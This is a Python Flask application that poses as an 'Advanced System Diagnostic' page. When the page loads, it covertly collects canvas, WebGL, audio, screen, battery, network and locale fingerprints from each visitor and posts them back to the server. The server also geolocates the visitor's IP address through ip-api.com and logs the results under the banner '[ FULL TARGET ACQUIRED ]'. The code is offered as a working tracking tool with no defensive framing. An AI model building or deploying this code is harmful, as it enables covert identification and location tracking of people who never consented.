from flask import Flask, request, render_template_string
import urllib.request
import json

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Advanced System Diagnostic</title>
    <script>
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                hash |= 0;
            }
            return hash.toString(16);
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = "top";
                ctx.font = "16px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("PlanIT Diagnostics", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("PlanIT Diagnostics", 4, 17);
                return simpleHash(canvas.toDataURL());
            } catch (e) {
                return "Unsupported";
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { vendor: 'No WebGL', renderer: 'No WebGL' };
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
                return { vendor, renderer };
            } catch (e) {
                return { vendor: 'Error', renderer: 'Error' };
            }
        }

        async function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain();
                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;

                audioCtx.resume();
                oscillator.connect(gainNode);
                gainNode.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(audioCtx.destination);

                return new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function (e) {
                        const output = e.inputBuffer.getChannelData(0);
                        let sum = 0;
                        for (let i = 0; i < output.length; i++) {
                            sum += Math.abs(output[i]);
                        }
                        scriptProcessor.onaudioprocess = null;
                        oscillator.stop();
                        audioCtx.close();
                        resolve(simpleHash(sum.toString()));
                    };
                    oscillator.start(0);
                });
            } catch (e) {
                return "Unsupported";
            }
        }

        window.onload = async function() {
            const webgl = getWebGLInfo();
            const audioHash = await getAudioFingerprint();

            const fingerprint = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenResolution: window.screen.width + "x" + window.screen.height,
                availResolution: window.screen.availWidth + "x" + window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                cookieEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                canvasHash: getCanvasFingerprint(),
                webglVendor: webgl.vendor,
                webglRenderer: webgl.renderer,
                audioFingerprint: audioHash
            };

            if (navigator.userAgentData) {
                fingerprint.mobile = navigator.userAgentData.mobile;
                fingerprint.brands = navigator.userAgentData.brands.map(b => b.brand + " v" + b.version).join(", ");
                fingerprint.platformDetails = navigator.userAgentData.platform;
            }

            if (screen.orientation) {
                fingerprint.orientation = screen.orientation.type;
            }

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    fingerprint.batteryLevel = Math.round(battery.level * 100) + '%';
                    fingerprint.batteryCharging = battery.charging;
                } catch (e) {
                    fingerprint.batteryLevel = 'Unavailable';
                }
            }

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                fingerprint.effectiveType = connection.effectiveType || 'Unknown';
                fingerprint.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
                fingerprint.rtt = connection.rtt ? connection.rtt + ' ms' : 'Unknown';
            }

            fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fingerprint)
            });
        };
    </script>
</head>
<body style="background: #09090b; color: #a1a1aa; text-align: center; font-family: monospace; margin-top: 100px;">
    <h1 style="color: #f43f5e;">Deep Hardware Scan Active...</h1>
    <p>Extracting comprehensive system profiles.</p>
</body>
</html>
"""

def get_location_from_ip(ip_address):
    if not ip_address or ip_address in ["127.0.0.1", "localhost"] or ip_address.startswith("10.") or ip_address.startswith("192.168."):
        return "Local / Proxy Network"
    try:
        url = f"http://ip-api.com/json/{ip_address}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get('status') == 'success':
                return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')} (ISP: {data.get('isp')})"
    except Exception:
        pass
    return "Lookup Failed"

@app.route('/')
def home():
    # Properly grab the real client IP passed through Render's proxy headers
    if request.headers.get('CF-Connecting-IP'):
        client_ip = request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        client_ip = request.remote_addr
        
    location = get_location_from_ip(client_ip)
    
    print(f"\n================ [ FULL TARGET ACQUIRED ] ================")
    print(f" [IP Address] : {client_ip}")
    print(f" [Location]   : {location}")
    print(f" [User-Agent] : {request.headers.get('User-Agent')}")
    print(f"==========================================================")
    
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_device():
    data = request.json
    if data:
        print(f"\n-------------- [ HARDWARE & RENDERING FINGERPRINT ] --------------")
        print(f" * GPU Vendor        : {data.get('webglVendor')}")
        print(f" * GPU Renderer      : {data.get('webglRenderer')}")
        print(f" * Canvas Hash       : {data.get('canvasHash')}")
        print(f" * Audio Hash        : {data.get('audioFingerprint')}")
        print(f" * OS / Platform     : {data.get('platform')} ({data.get('platformDetails')})")
        print(f" * Mobile Device?    : {data.get('mobile')}")
        print(f" * Timezone          : {data.get('timezone')}")
        print(f" * Screen Resolution : {data.get('screenResolution')} (Avail: {data.get('availResolution')})")
        print(f" * Color Depth       : {data.get('colorDepth')}-bit | Pixel Ratio: {data.get('pixelRatio')}")
        print(f" * CPU Cores         : {data.get('hardwareConcurrency')}")
        print(f" * Estimated RAM     : {data.get('deviceMemory')} GB")
        print(f" * Network Speed     : {data.get('effectiveType')} (~{data.get('downlink')})")
        print(f" * Battery Status    : {data.get('batteryLevel')} (Charging: {data.get('batteryCharging')})")
        print(f"------------------------------------------------------------------\n")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
